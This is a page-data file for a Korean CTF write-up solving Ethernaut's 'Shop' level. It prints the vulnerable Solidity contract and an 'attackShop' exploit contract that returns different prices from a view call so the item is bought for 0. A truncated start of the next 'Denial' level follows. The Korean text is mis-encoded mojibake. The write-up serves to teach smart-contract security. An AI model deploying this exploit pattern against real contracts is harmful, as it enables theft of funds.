{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/CTFs/21_shop_ethernaut/21_shop_ethernaut/",
    "result": {"data":{"cur":{"id":"ce85a566-c4ee-5982-a1b1-9a69272b1f1e","html":"<h1 id=\"-1-shop\" style=\"position:relative;\"><a href=\"#-1-shop\" aria-label=\" 1 shop permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ğŸ‘‹ 1. Shop</h1>\n<p><strong>Difficulty 4/10</strong></p>\n<ul>\n<li>ìŠ¹ë¦¬ ì¡°ê±´</li>\n<li>ì½”ë“œ ë¶„ì„</li>\n<li>í’€ì´</li>\n</ul>\n<p>ìˆœì„œë¡œ ì§„í–‰ ë  ê²ƒì´ë‹¤.</p>\n<hr>\n<h2 id=\"ìŠ¹ë¦¬-ì¡°ê±´\" style=\"position:relative;\"><a href=\"#%EC%8A%B9%EB%A6%AC-%EC%A1%B0%EA%B1%B4\" aria-label=\"ìŠ¹ë¦¬ ì¡°ê±´ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ìŠ¹ë¦¬ ì¡°ê±´</h2>\n<ul>\n<li>contractì—ì„œ ì œì‹œí•œ priceë³´ë‹¤ ë‚®ì€ ê°€ê²©ì— item ì‚¬ê¸°</li>\n</ul>\n<hr>\n<h2 id=\"ì½”ë“œ-ë¶„ì„\" style=\"position:relative;\"><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\" aria-label=\"ì½”ë“œ ë¶„ì„ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ì½”ë“œ ë¶„ì„</h2>\n<p>ë¶„ì„ì€ ì£¼ì„ì— ìˆìŠµë‹ˆë‹¤!</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// Buyerì˜ Interface</span>\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">Buyer</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// priceëŠ” external view í•¨ìˆ˜ì´ë©° uint256ì„ returní•œë‹¤.</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">price</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Shop</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token comment\">// priceê°€ 100ìœ¼ë¡œ ì„¤ì •ë¨    </span>\n    <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> price <span class=\"token operator\">=</span> <span class=\"token number\">100</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// ë¬¼ê±´ì´ íŒ”ë ¸ëŠ”ì§€ í™•ì¸í•˜ëŠ” bool ê°’, initial value: false</span>\n    <span class=\"token builtin\">bool</span> <span class=\"token keyword\">public</span> isSold<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// ë¬¼ê±´ì„ ì‚¬ëŠ” í•¨ìˆ˜</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">buy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// _buyerë¥¼ msg.senderë¡œ ì„¤ì •</span>\n        Buyer _buyer <span class=\"token operator\">=</span> <span class=\"token function\">Buyer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// ë§Œì•½ _buyer.priceê°€ 100 ì´ìƒì´ê³ , isSoldê°€ falseì´ë©´ ì§„í–‰</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>_buyer<span class=\"token punctuation\">.</span><span class=\"token function\">price</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> price <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span>isSold<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token comment\">// ë¬¼ê±´ì„ ìƒ€ë‹¤!</span>\n            isSold <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">// priceë¥¼ _buyer.price()ë¡œ ë°”ê¾¼ë‹¤. </span>\n            price <span class=\"token operator\">=</span> _buyer<span class=\"token punctuation\">.</span><span class=\"token function\">price</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<hr>\n<h2 id=\"í’€ì´\" style=\"position:relative;\"><a href=\"#%ED%92%80%EC%9D%B4\" aria-label=\"í’€ì´ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>í’€ì´</h2>\n<h3 id=\"ë“¤ì–´ê°€ê¸°-ì „\" style=\"position:relative;\"><a href=\"#%EB%93%A4%EC%96%B4%EA%B0%80%EA%B8%B0-%EC%A0%84\" aria-label=\"ë“¤ì–´ê°€ê¸° ì „ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ë“¤ì–´ê°€ê¸° ì „</h3>\n<p>ë¨¼ì € íŒíŠ¸ë¥¼ ë³´ì</p>\n<ol>\n<li>êµ¬ë§¤ìê°€ ì‚¬ìš©í•  ìƒì </li>\n<li>View ê¸°ëŠ¥ì˜ ì œí•œ ì‚¬í•­ ì´í•´ (&#x3C;- ì¤‘ìš”í•œ ë¶€ë¶„)</li>\n</ol>\n<p>ìš°ë¦¬ëŠ” viewì˜ ê¸°ëŠ¥ì„ ì‚¬ìš©í•´ ë¬¸ì œë¥¼ í’€ ìˆ˜ ìˆë‹¤.\n<br/></p>\n<h3 id=\"í’€ì´-1\" style=\"position:relative;\"><a href=\"#%ED%92%80%EC%9D%B4-1\" aria-label=\"í’€ì´ 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>í’€ì´</h3>\n<p>viewë¥¼ ì–´ë–»ê²Œ ì‚¬ìš©í•´ì•¼ Shop contractë¥¼ í•´í‚¹ í•  ìˆ˜ ìˆì„ê¹Œ?\në‹¤ìŒ AttackContractë¥¼ í™•ì¸í•´ë³´ì</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">attackShop</span> <span class=\"token punctuation\">{</span>\n\n    Shop shop<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Shop contractë¥¼ shopìœ¼ë¡œ ì§€ì •í•œë‹¤.</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _shop<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        shop <span class=\"token operator\">=</span> <span class=\"token function\">Shop</span><span class=\"token punctuation\">(</span>_shop<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// shopì˜ buy()ì„ ì‹¤í–‰ì‹œí‚¤ë‹¤.</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        shop<span class=\"token punctuation\">.</span><span class=\"token function\">buy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// ë§Œì•½ isSoldê°€ trueë©´ 0ì„ returní•˜ê³  falseë©´ 100ì„ returní•œë‹¤</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">price</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> shop<span class=\"token punctuation\">.</span><span class=\"token function\">isSold</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token number\">100</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div>\n<br/>\n<p>ì´ ë¬¸ì œëŠ” <a href=\"https://holyhansss.github.io/ethernaut/11_elevator_ethernaut/11_elevator_ethernaut/\">Eelevator ë¬¸ì œ</a>ì™€ ë¹„ìŠ·í•œ ë¬¸ì œì´ë‹¤.</p>\n<p>ìœ„ ì½”ë“œë¥¼ ê°€ì§€ê³  ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ìƒê°í•´ë³´ì</p>\n<ol>\n<li>attackShop contractë¥¼ Shopì˜ addressë¥¼ ì¸ìë¡œí•˜ì—¬ ë°°í¬í•œë‹¤.</li>\n<li>attackShop.attack()ì„ ì‹¤í–‰ì‹œí‚¨ë‹¤.</li>\n<li>Shop.buy()ì—ì„œ ifë¬¸ì„ í†µê³¼í•˜ê³  isSoldê°€ trueë¡œ ë°”ë€ë‹¤.</li>\n<li>attackShop.price()ëŠ” isSoldê°€ trueê¸° ë•Œë¬¸ì— Shop.price()ë¥¼ 0ìœ¼ë¡œ ë°”ê¾¼ë‹¤.</li>\n</ol>\n<br/>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 292px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 40%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAABJ0AAASdAHeZh94AAABN0lEQVQoz52RD2+CMBTE/f6fb27TUYH5BwtIS1VaWuC31KmZy5Yse8n1XvqSe3ftzHvP6XQky3Pe11tMq5HFlkLWHA6KqqzYbdbM50+IlUCXijbXmFzjz55Y0zRdeBgGZrF3zpKmKassI00FYpWwl5I0y9luN2w2a4RYoVSDKST1PKF+XtLVDSdz5FPuKhibcRxQWqONoTnUNErhXEdZ1Wit0K2mURofAlPfY5sDZ7kjOIvt7KPDEAIxdle1BOv5Tz0IxiP4gLc93nlCHy6D26LIcR45Pk3f93SdxTnHNI6MV0TRi6APnq49YpKa9q2iKwxlKRGJIBcpyWLBXlbspGS5fCXLM55f3tjv5d3dt08Zcc6jtaPRFh+mP8WMrn66u0Q+nx1VeWJXGJwb4t57lN9wc/YV0eEHee5rL9QU2VsAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"isSold\"\n        title=\"isSold\"\n        src=\"/static/50ce1514f627f9a469965102325d4790/2e9f9/isSold.png\"\n        srcset=\"/static/50ce1514f627f9a469965102325d4790/e9ff0/isSold.png 180w,\n/static/50ce1514f627f9a469965102325d4790/2e9f9/isSold.png 292w\"\n        sizes=\"(max-width: 292px) 100vw, 292px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>ìœ„ì™€ ê°™ì€ ì‹œë‚˜ë¦¬ì˜¤ë¡œ isSoldê°€ trueê°€ ë˜ì—ˆê³  priceê°€ 0ì´ ëœ ê²ƒì„ í™•ì¸í–ˆë‹¤ë©´ ethernautìœ¼ë¡œ ëŒì•„ì™€ Submit instanceë¥¼ ëˆ„ë¥´ê³  ì¡°ê¸ˆ ê¸°ë‹¤ë¦¬ë©´ blockì´ mineë˜ê³ , ì•„ë˜ì™€ ê°™ì´ ëœ¨ë©° ë§ˆë¬´ë¦¬ëœë‹¤.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">Ù©(- Ì®Ì®Ìƒ-Ìƒ)Û¶ Well done, You have completed this level!!!</code></pre></div>\n<hr>\n<h2 id=\"ë§ˆë¬´ë¦¬\" style=\"position:relative;\"><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\" aria-label=\"ë§ˆë¬´ë¦¬ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ë§ˆë¬´ë¦¬</h2>\n<p>ì—­ì‹œ ethernautë¥¼ í’€ë©´ì„œ solidityì— ëŒ€í•´ ë‹¤ì‹œ ë³µìŠµí•˜ê³  ìˆëŠ”ê²ƒ ê°™ë‹¤. <code class=\"language-text\">send vs transfer vs call</code>ì— ëŒ€í•´ì„œë„ ë‹¤ì‹œ ì°¾ì•„ë³´ë©° ê³µë¶€í•  ìˆ˜ ìˆì—ˆê³ , assert, revertì™€ requireì˜ ì°¨ì´ì ì„ ê³µë¶€í•  ìˆ˜ ìˆì—ˆë˜ ë¬¸ì œì˜€ë˜ ê²ƒ ê°™ë‹¤.</p>\n<hr>\n<h2 id=\"ref\" style=\"position:relative;\"><a href=\"#ref\" aria-label=\"ref permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>REF</h2>\n<ul>\n<li>rinkeyb network ether faucet: <a href=\"https://faucets.chain.link/rinkeby\">https://faucets.chain.link/rinkeby</a></li>\n<li>ethernaut: <a href=\"https://ethernaut.openzeppelin.com/\">https://ethernaut.openzeppelin.com/</a></li>\n<li>remix IDE: <a href=\"https://remix.ethereum.org\">https://remix.ethereum.org</a></li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EC%8A%B9%EB%A6%AC-%EC%A1%B0%EA%B1%B4\">ìŠ¹ë¦¬ ì¡°ê±´</a></p>\n</li>\n<li>\n<p><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\">ì½”ë“œ ë¶„ì„</a></p>\n</li>\n<li>\n<p><a href=\"#%ED%92%80%EC%9D%B4\">í’€ì´</a></p>\n<ul>\n<li><a href=\"#%EB%93%A4%EC%96%B4%EA%B0%80%EA%B8%B0-%EC%A0%84\">ë“¤ì–´ê°€ê¸° ì „</a></li>\n<li><a href=\"#%ED%92%80%EC%9D%B4-1\">í’€ì´</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\">ë§ˆë¬´ë¦¬</a></p>\n</li>\n<li>\n<p><a href=\"#ref\">REF</a></p>\n</li>\n</ul>\n</div>","excerpt":"ğŸ‘‹ 1. Shop Difficulty 4/10 ìŠ¹ë¦¬ ì¡°ê±´ ì½”ë“œ ë¶„ì„ í’€ì´ ìˆœì„œë¡œ ì§„í–‰ ë  ê²ƒì´ë‹¤. ìŠ¹ë¦¬ ì¡°ê±´ contractì—ì„œ ì œì‹œí•œ priceë³´ë‹¤ ë‚®ì€ ê°€ê²©ì— item ì‚¬ê¸° ì½”ë“œ ë¶„ì„ ë¶„ì„ì€ ì£¼ì„ì— ìˆìŠµë‹ˆë‹¤! í’€ì´ ë“¤ì–´ê°€ê¸° ì „ ë¨¼ì € íŒíŠ¸ë¥¼ ë³´ì êµ¬ë§¤ìê°€ ì‚¬ìš©í•  ìƒì  View ê¸°ëŠ¥ì˜ ì œí•œ ì‚¬í•­ ì´í•´ (<- ì¤‘ìš”í•œ ë¶€ë¶„) ìš°ë¦¬ëŠ” viewì˜ ê¸°ëŠ¥ì„ ì‚¬ìš©í•´ ë¬¸ì œë¥¼ í’€ ìˆ˜ ìˆë‹¤.\n í’€ì´ viewë¥¼ ì–´ë–»ê²Œ ì‚¬ìš©í•´ì•¼ Shop contractë¥¼ í•´í‚¹ í•  ìˆ˜ ìˆì„ê¹Œ?\në‹¤ìŒ AttackContractë¥¼ í™•ì¸í•´ë³´ì ì´ ë¬¸ì œëŠ” Eelevator ë¬¸ì œì™€ ë¹„ìŠ·í•œ ë¬¸ì œì´ë‹¤. ìœ„ ì½”ë“œë¥¼ ê°€ì§€ê³  ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ìƒê°í•´ë³´ì attackShop contractë¥¼ Shopì˜ addressë¥¼ ì¸ìë¡œí•˜ì—¬ ë°°í¬í•œë‹¤. attackShop.attack()ì„ ì‹¤í–‰ì‹œí‚¨ë‹¤. Shop.buy()ì—ì„œ ifë¬¸ì„ í†µê³¼í•˜ê³  isSoldê°€ trueë¡œ ë°”ë€ë‹¤. attackShop.price()ëŠ” isSoldê°€ trueê¸° ë•Œë¬¸ì— Shop.pâ€¦","frontmatter":{"date":"February 07, 2022","title":"(Ethernaut ì·¨ì•½ì  21) Shop","categories":"ì·¨ì•½ì ë¶„ì„","author":"í•œì„±ì›","emoji":"ğŸ§¢"},"fields":{"slug":"/CTFs/21_shop_ethernaut/21_shop_ethernaut/"}},"next":{"id":"98d9a6bd-c1a7-5ca8-bff4-a94ac8a22918","html":"<h1 id=\"-1-denial\" style=\"position:relative;\"><a href=\"#-1-denial\" aria-label=\" 1 denial permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ğŸ‘‹ 1. Denial</h1>\n<p><strong>Difficulty 5/10</strong></p>\n<ul>\n<li>ìŠ¹ë¦¬ ì¡°ê±´</li>\n<li>ì½”ë“œ ë¶„ì„</li>\n<li>í’€ì´</li>\n</ul>\n<p>ìˆœì„œë¡œ ì§„í–‰ ë  ê²ƒì´ë‹¤.</p>\n<hr>\n<h2 id=\"ìŠ¹ë¦¬-ì¡°ê±´\" style=\"position:relative;\"><a href=\"#%EC%8A%B9%EB%A6%AC-%EC%A1%B0%EA%B1%B4\" aria-label=\"ìŠ¹ë¦¬ ì¡°ê±´ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ìŠ¹ë¦¬ ì¡°ê±´</h2>\n<ul>\n<li>Ownerê°€ withdrawí•˜ì§€ ëª»í•˜ê²Œí•˜ë©´ ìŠ¹ë¦¬í•œë‹¤.</li>\n<li>Owner ì¸ì¶œë¶ˆê°€ ìƒíƒœ ë§Œë“¤ê¸°</li>\n</ul>\n<hr>\n<h2 id=\"ì½”ë“œ-ë¶„ì„\" style=\"position:relative;\"><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\" aria-label=\"ì½”ë“œ ë¶„ì„ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ì½”ë“œ ë¶„ì„</h2>\n<p>ë¶„ì„ì€ ì£¼ì„ì— ìˆìŠµë‹ˆë‹¤!</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">Denial</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//  íŒŒíŠ¸ë„ˆê°€ ë˜ì–´ ìê¸ˆì„ 1%ì”© ì¸ì¶œ í•  ìˆ˜ ìˆë‹¤.</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> partner<span class=\"token punctuation\">;</span> <span class=\"token comment\">// withdrawal partner - pay the gas, split the withdraw</span>\n    <span class=\"token comment\">//  Ownerì˜ Address</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> owner <span class=\"token operator\">=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xA9E</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//  ë§ˆì§€ë§‰ìœ¼ë¡œ withdrawí–ˆì„ë•Œì˜ ì‹œê°„</span>\n    <span class=\"token builtin\">uint</span> timeLastWithdrawn<span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// íŒŒíŠ¸ë„ˆë³„ withdrawí•œ ì•¡ìˆ˜</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> withdrawPartnerBalances<span class=\"token punctuation\">;</span> <span class=\"token comment\">// keep track of partners balances</span>\n\n    <span class=\"token comment\">//  ëˆ„êµ¬ë‚˜ ìì‹  ë˜ëŠ” ë‹¤ë¥¸ addressë¥¼ íŒŒíŠ¸ë„ˆë¡œ ì„¤ì •í•  ìˆ˜ ìˆë‹¤.</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">setWithdrawPartner</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _partner<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        partner <span class=\"token operator\">=</span> _partner<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">//  withdraw 1% to recipient and 1% to owner</span>\n    <span class=\"token comment\">//  ownerì™€ íŒŒíŠ¸ë„ˆê°€ 1%ì”© ì¸ì¶œ í•  ìˆ˜ ìˆë‹¤.</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 